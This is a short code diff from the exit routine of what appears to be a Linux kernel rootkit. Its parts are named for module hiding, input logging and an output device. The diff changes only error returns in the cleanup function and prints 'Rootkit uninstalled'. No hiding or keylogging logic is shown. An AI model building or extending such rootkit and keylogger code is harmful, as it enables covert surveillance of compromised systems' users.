@@ -29,11 +29,13 @@ static void __exit main_exit(void) {
 	int error;
 
 	error = moduleHide_exit();
-	if (error) return error;
+	if (error) return; // TOOD: warn about the error rather than return...
+	
 	error = logInput_exit();
-	if (error) return error;
+	if (error) return;
+	
 	error = outputDevice_exit();
-	if (error) return error;
+	if (error) return;
 
 	printk(KERN_INFO "Rootkit uninstalled\n");
 }
